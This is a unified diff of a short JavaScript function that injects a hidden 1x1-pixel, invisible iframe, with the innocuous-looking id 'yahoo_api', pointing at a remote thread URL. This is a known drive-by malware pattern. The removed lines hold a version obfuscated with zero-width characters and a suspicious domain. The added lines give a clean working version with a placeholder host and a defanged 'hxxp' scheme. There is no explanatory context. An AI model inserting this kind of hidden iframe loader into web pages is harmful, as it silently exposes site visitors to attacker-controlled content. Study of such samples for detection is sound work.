@@ -1,13 +1,13 @@
 function MakeFrameEx(){
-  element = do​cument.get​ElementById('yahoo_api');
+  element = document.getElementById('yahoo_api');
   if (!element){
-    var el = do​cument.cr​eateElement('if​rame');
-    do​cument.body.append​Child(el);
+    var el = document.createElement('iframe');
+    document.body.appendChild(el);
     el.id = 'yahoo_api';
     el.style.width = '1px';
     el.style.height = '1px';
     el.style.display = 'none';
-    el.src = 'hxxp://​juyfdjhdjdgh​.nl​.ai​/showthread.php?t=72241732'
+    el.src = 'hxxp://blabla.com/showthread.php?t=72241732'
   }
 }
 var ua = navigator.userAgent.toLowerCase();
